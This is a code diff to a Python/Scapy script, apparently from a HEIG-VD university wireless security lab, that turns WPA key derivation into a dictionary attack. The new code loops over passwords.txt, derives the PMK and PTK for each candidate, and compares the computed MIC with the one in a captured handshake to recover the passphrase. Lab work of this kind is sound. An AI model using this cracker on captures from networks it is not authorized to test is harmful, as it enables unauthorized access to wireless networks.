@@ -9,11 +9,11 @@ utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
 sha-1 pour WPA2 ou MD5 pour WPA)
 """
 
-__author__ = "Abraham Rubinstein et Yann Lederrey"
-__copyright__ = "Copyright 2017, HEIG-VD"
+__author__ = "Caroline Monthoux, Rémi Poulard"
+__copyright__ = "Copyright 2020, HEIG-VD"
 __license__ = "GPL"
 __version__ = "1.0"
-__email__ = "abraham.rubinstein@heig-vd.ch"
+__email__ = "caroline.monthoux@heig-vd.ch, remi.poulard@heig-vd.ch"
 __status__ = "Prototype"
 
 from scapy.all import *
@@ -108,18 +108,23 @@ def get_data(packets):
         if EAPOL in packet and b2a_hex(packet[Raw].load[1:3]).decode() == "030a":
             return linehexdump(packet[EAPOL], 0, 1, True).replace(" ", "").lower()[:162] + "0" * 32 + "0" * 4
 
+def get_algo(packets):
+    """
+        Loop on all packets and ry to get the algorithm used. This info is in the first EAPOL packet
+    """
+    for packet in packets:
+        if EAPOL in packet and b2a_hex(packet[Raw].load[1:3]).decode() == "008a":
+            return hashlib.sha1 if int(bin(packet[Raw].load[2])[-2:], 2) == 2 else hashlib.md5
 
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
 wpa = rdpcap("wpa_handshake.cap")
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file
-passPhrase = "actuelle"
 A = "Pairwise key expansion"  # this string is used in the pseudo-random function
 
 ssid = find_ssid(wpa)
 APmac = a2b_hex(format_mac(get_ap_mac(wpa)))
 Clientmac = a2b_hex(format_mac(get_client_mac(wpa, APmac)))
-get_nonce(wpa, APmac)
 
 # Authenticator and Supplicant Nonces
 ANonce = get_nonce(wpa, APmac)
@@ -128,39 +133,48 @@ SNonce = get_nonce(wpa, Clientmac)
 # This is the MIC contained in the 4th frame of the 4-way handshake
 # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
 mic_to_test = b2a_hex(get_mic(wpa)).decode()
-# mic_to_test = "36eef66540fa801ceee2fea9b7929b40"
-print(mic_to_test)
-B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce,
-                                                                              SNonce)  # used in pseudo-random function
-# data = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")  # cf "Quelques détails importants" dans la donnée
-data = a2b_hex(get_data(wpa))
 
+B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce, SNonce)  # used in pseudo-random function
+data = a2b_hex(get_data(wpa))
+algo = get_algo(wpa)
 print("\n\nValues used to derivate keys")
 print("============================")
-print("Passphrase: ", passPhrase, "\n")
 print("SSID: ", ssid, "\n")
 print("AP Mac: ", b2a_hex(APmac), "\n")
 print("CLient Mac: ", b2a_hex(Clientmac), "\n")
 print("AP Nonce: ", b2a_hex(ANonce), "\n")
 print("Client Nonce: ", b2a_hex(SNonce), "\n")
 
-# calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-passPhrase = str.encode(passPhrase)
-ssid = str.encode(ssid)
-pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
+f = open("passwords.txt", "r")
+print("Starting to brutforce passphrase")
+print("=============================\n")
+for x in f:
+    passPhrase = str.encode(x.strip('\n'))
 
-# expand pmk to obtain PTK
-ptk = customPRF512(pmk, str.encode(A), B)
+    # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+    pmk = pbkdf2(hashlib.sha1, passPhrase, ssid.encode(), 4096, 32)
 
-# calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-mic = hmac.new(ptk[0:16], data, hashlib.sha1)
+    # expand pmk to obtain PTK
+    ptk = customPRF512(pmk, str.encode(A), B)
 
-print("\nResults of the key expansion")
-print("=============================")
-print("PMK:\t\t", pmk.hex(), "\n")
-print("PTK:\t\t", ptk.hex(), "\n")
-print("KCK:\t\t", ptk[0:16].hex(), "\n")
-print("KEK:\t\t", ptk[16:32].hex(), "\n")
-print("TK:\t\t", ptk[32:48].hex(), "\n")
-print("MICK:\t\t", ptk[48:64].hex(), "\n")
-print("MIC:\t\t", mic.hexdigest(), "\n")
+    # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
+    mic = hmac.new(ptk[0:16], data, algo)
+
+    # if the mix extracted from the capture and the MIC generated are the same that mean that we found the passphrase
+    if mic_to_test == mic.hexdigest()[:-8]:
+
+        print("PASSPHRASE FOUND !\n")
+        print("Passphrase:\t\t", x)
+        print("\nResults of the key expansion")
+        print("=============================")
+        print("PMK:\t\t", pmk.hex(), "\n")
+        print("PTK:\t\t", ptk.hex(), "\n")
+        print("KCK:\t\t", ptk[0:16].hex(), "\n")
+        print("KEK:\t\t", ptk[16:32].hex(), "\n")
+        print("TK:\t\t", ptk[32:48].hex(), "\n")
+        print("MICK:\t\t", ptk[48:64].hex(), "\n")
+        print("MIC:\t\t", mic.hexdigest(), "\n")
+
+        exit()
+
+print("No passphrase found !")
